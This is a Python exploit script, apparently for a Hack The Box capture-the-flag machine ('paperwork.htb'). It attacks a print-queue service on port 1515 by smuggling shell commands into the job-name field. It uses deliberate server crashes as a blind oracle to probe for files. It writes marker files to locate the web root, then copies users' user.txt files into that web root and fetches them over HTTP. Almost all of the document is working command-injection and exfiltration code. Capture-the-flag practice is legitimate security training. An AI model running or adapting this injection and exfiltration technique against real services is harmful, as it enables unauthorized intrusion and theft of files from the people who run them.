#!/usr/bin/env python3
"""Fast exfil: find web root, write flag, read via HTTP."""
import socket, time, sys, select, urllib.request, urllib.error, os

T = '10.129.38.158'
CACHE = '/home/yaser/raphael-2.0/exfil'
os.makedirs(CACHE, exist_ok=True)

def lpd_send(job_name, timeout=8):
    s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect((T, 1515))
        s.send(b'\x02archive_intake\n')
        time.sleep(0.1)
        ready = select.select([s], [], [], 1)
        if ready[0]: s.recv(1024)
        content = f'J{job_name}\n'.encode()
        s.send(b'\x02' + str(len(content)).encode() + b'\n')
        time.sleep(0.2)
        ready = select.select([s], [], [], 3)
        if ready[0]: s.recv(1024)
        s.send(content)
        time.sleep(0.2)
        s.recv(4096)
    except: pass
    finally: s.close()

def alive():
    s = socket.socket(); s.settimeout(2)
    try:
        s.connect((T, 1515)); s.send(b'\x03'); d = s.recv(4096); s.close(); return True
    except: return False

def kill_if(condition):
    lpd_send(f"';{condition} && pkill -f server.py;echo '")
    time.sleep(0.1)
    a = alive()
    if not a:
        for _ in range(20):
            time.sleep(0.3)
            if alive(): break
        return True
    return False

def http_get(path, host='paperwork.htb'):
    try:
        req = urllib.request.Request(f'http://{T}{path}', headers={'Host': host})
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except: return None, None

# Step 1: Find nginx config location
print("=== Finding nginx config ===", flush=True)
for conf in ['/etc/nginx/sites-enabled/default', '/etc/nginx/conf.d/default.conf', 
             '/etc/nginx/nginx.conf', '/etc/nginx/sites-enabled/paperwork',
             '/etc/nginx/conf.d/paperwork.htb.conf']:
    if kill_if(f'test -f {conf}'):
        print(f'  Found: {conf}', flush=True)
    time.sleep(0.1)

# Step 2: Find the web root by checking common locations
print("\n=== Finding web root ===", flush=True)
MARKER = f'EXFIL_{os.urandom(8).hex()}'

web_roots = [
    '/var/www/html',
    '/usr/share/nginx/html',
    '/var/www',
    '/srv/http',
    '/var/www/paperwork.htb',
    '/var/www/html/paperwork',
    '/var/www/intranet',
    '/opt/www',
]

for root in web_roots:
    # Try to write a marker file
    lpd_send(f"';echo {MARKER} > {root}/EXFIL_MARKER 2>&1;echo '")
    time.sleep(0.2)
    # Check if we can read it via HTTP
    status, body = http_get('/EXFIL_MARKER')
    if status and MARKER in (body or b'').decode(errors='replace'):
        print(f'  *** WEB ROOT: {root} (accessible via /EXFIL_MARKER) ***', flush=True)
        web_root = root
        break
    # Try other URL mappings
    for url_path in [f'/html/EXFIL_MARKER', f'/paperwork/EXFIL_MARKER', f'/intranet/EXFIL_MARKER']:
        status, body = http_get(url_path)
        if status and body and MARKER in body.decode(errors='replace'):
            print(f'  *** WEB ROOT: {root} (accessible via {url_path}) ***', flush=True)
            web_root = root
            break
    if 'web_root' in dir():
        break
    time.sleep(0.1)
else:
    print("  Could not find writable web root via standard paths", flush=True)
    web_root = None

# Step 3: Try to read nginx config directly
if web_root is None:
    print("\n=== Trying to read nginx config ===", flush=True)
    # Try to find the config via locate/find
    lpd_send("';find /etc/nginx -name '*.conf' -type f 2>/dev/null > /tmp/nginx_confs;echo '")
    time.sleep(0.5)
    
    # Check each config location and get its content
    for cf in ['/etc/nginx/sites-enabled/default', '/etc/nginx/conf.d/default.conf']:
        # Copy config to /tmp/ readable location
        lpd_send(f"';cp {cf} /tmp/nginx_cfg 2>/dev/null || cp {cf}.conf /tmp/nginx_cfg 2>/dev/null;echo '")
        time.sleep(0.3)

# Step 4: If we found a writable web root, write the flag
if web_root:
    print(f"\n=== Writing flag to {web_root} ===", flush=True)
    lpd_send(f"';cat /home/*/user.txt 2>/dev/null | head -100 > {web_root}/FLAG_OUT 2>&1;echo '")
    time.sleep(0.5)
    
    status, body = http_get('/FLAG_OUT')
    if status:
        text = (body or b'').decode(errors='replace')
        print(f'  HTTP {status}: {text}', flush=True)
        import re
        flags = re.findall(r'HTB\{[^}]+\}', text)
        if flags:
            print(f'\n  *** FLAG: {flags[0]} ***', flush=True)
            with open(f'{CACHE}/flag.txt', 'w') as f:
                f.write(flags[0])
    else:
        print('  Could not read flag via HTTP', flush=True)

# Step 5: Fall back to oracle extraction
if not web_root or not os.path.exists(f'{CACHE}/flag.txt'):
    print("\n=== Fallback: Try to read flag through RCE ===", flush=True)
    
    # Find the flag file
    print("Finding flag location...", flush=True)
    flag_path = None
    for path in ['/home/*/user.txt', '/user.txt', '/flag.txt', '/flag', '/root/root.txt',
                 '/home/dave/user.txt', '/home/paper/user.txt', '/home/paperwork/user.txt',
                 '/home/lp/user.txt', '/home/lpd/user.txt']:
        if kill_if(f'test -f {path}'):
            print(f'  Found: {path}', flush=True)
            flag_path = path
            break
        time.sleep(0.1)
    
    if flag_path and kill_if(f'cat {flag_path} > /dev/null 2>&1'):
        print(f'  {flag_path} is readable!', flush=True)
        
        # Get the flag content and write to multiple expected web paths
        print("  Writing flag to potential web paths...", flush=True)
        for root in web_roots:
            lpd_send(f"';cat {flag_path} 2>/dev/null > {root}/FLAG 2>&1;echo '")
            time.sleep(0.2)
        
        time.sleep(0.5)
        for url in ['/FLAG', '/flag', '/FLAG_OUT']:
            status, body = http_get(url)
            if status:
                text = (body or b'').decode(errors='replace')
                if 'HTB{' in text:
                    print(f'  *** FLAG via {url}: {text.strip()} ***', flush=True)
                    with open(f'{CACHE}/flag.txt', 'w') as f:
                        f.write(text.strip())
                    break

if os.path.exists(f'{CACHE}/flag.txt'):
    print(f"\nFlag saved to {CACHE}/flag.txt", flush=True)
else:
    print("\nCould not exfiltrate flag via web. Need oracle extraction.", flush=True)
